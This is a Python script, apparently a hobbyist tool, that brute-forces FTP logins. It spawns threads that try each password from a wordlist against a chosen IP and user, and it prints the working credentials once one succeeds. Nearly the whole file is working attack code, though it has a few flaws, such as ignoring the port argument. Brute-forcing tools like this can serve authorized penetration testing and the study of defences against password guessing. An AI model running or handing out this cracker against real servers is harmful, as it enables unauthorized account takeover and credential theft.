# Multi-threaded FTP cracker using the ftplib library login
# even after finding the password the other threads could be already failing and produce fails
# threads have some overhead so i recommend not adding many threads if your password list is short for clean results
# once a thread has succeeded there will be no more tries but you will have to grep for success between the already
# failing threads that are failing while the one thread succeeding.
import ftplib
import threading
import time
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('-t', '--target', help="target ip address")
parser.add_argument('-p', '--port', help="target port")
parser.add_argument('-u', '--user', help="target user")
parser.add_argument('-P', '--passlist', help="password file")
parser.add_argument('-T', '--threads', help="maximum thread count")
parser.add_argument('--clean',action="store_true" , help="only print success login, running silently")
parser.add_argument('--timeout', help="set the timeout for each connection")
args = parser.parse_args()

# validate all needed arguments are present
if not (args.target and args.port and args.user and args.passlist):
    print("Missing needed arguments")
    print("Usage: ftp_cracker-cli.py -t <IP> -p <port> -u <user> -P <password file> [--clean]")
    exit()

# validate target
target = args.target
if len(target.split(".")) != 4:
    print("target IP is invalid.. enter a proper IPv4 IP as a target")
    exit()
for octet in target.split("."):
    if not octet.isdigit():
        print("target IP is invalid.. enter a proper IPv4 IP as a target")
        exit()

# validate port and convert to int
port = args.port
if not port.isdigit():  # python magics
    port = input("Invalid Port Number (1 - 65535)")
    exit()
if not 0 < int(port) < 65535:
    port = input("Invalid Port Number (1 - 65535)")
    exit()
port = int(port)

# validate thread count and convert to int
if args.threads:
    thread_count = args.threads
else:
    thread_count = 1
if not 0 < int(thread_count) < 9999999:
    print("Dont be absurd... put a normal number of threads (I recommend between 1 and a million)")
    exit()
thread_count = int(thread_count)

# validate file exists without importing os because i keep forgetting about it and i already wrote this section
passFile = args.passlist
try:
    open(passFile, 'x')
    print("invalid path to password file. make sure you typed it correctly")
    exit()  # This means file did not exit and was created
except FileExistsError:
     pass  # This is good! x doesnt overwrite and throws error on existing

user = args.user
if args.timeout:
    timeout = args.timeout
else:
    timeout = 2

if args.clean:
    verbose = False
else:
    verbose = True

killswitch = False  # global killswitch to stop spawning threads. Can break the main loop from within an individual thread
ftp = ftplib.FTP()

# except Exception as e:
#     print(f"something went wrong: {e}")

# make a new ftp object connect with it and login with it for every function call. if found calls global killswitch.
def login(user, passwd, line):
    try:
        t = threading.current_thread()
        ftp = ftplib.FTP()
        ftp.connect(target, 21, timeout=timeout)
        status = ftp.lastresp
        ftp.login(user, passwd)
        status = ftp.lastresp
        print(f"status ok -> {status}")
        print(f"success - user:{user}, pass:{passwd}")
        global killswitch
        killswitch = True
        return True

    except:
        if verbose:
            print(f"line {line} fail - user:{user}, pass:{passwd}")
        return False

# for each line in a password file, spawn a thread calling ftplogin() while monitoring thread count and the killswitch
try:
    with open(passFile) as my_file:
        threads = []
        no_more_threads_please = True
        line_counter = 0
        for line in my_file:
            if killswitch:
                break
            password = line.replace("\n", "")
            line_counter += 1

            # Q: Too many threads?
            if threading.active_count() > thread_count:
                no_more_threads_please = True

            # A: Enter a waiting loop until not too many threads!
            while no_more_threads_please:
                if threading.active_count() > thread_count:
                    time.sleep(0.001)
                else:
                    no_more_threads_please = False
            # Finally: not too many threads! add another thread!
            x = threading.Thread(target=login, args=(user, password, line_counter))
            threads.append(x)
            x.start()

        # wait for all threads to finish... not sure if this is necessary or not all of this is confusing.
        for index, thread in enumerate(threads):
            thread.join()

except Exception as e:
    print(f"Something went wrong.\n{e}")
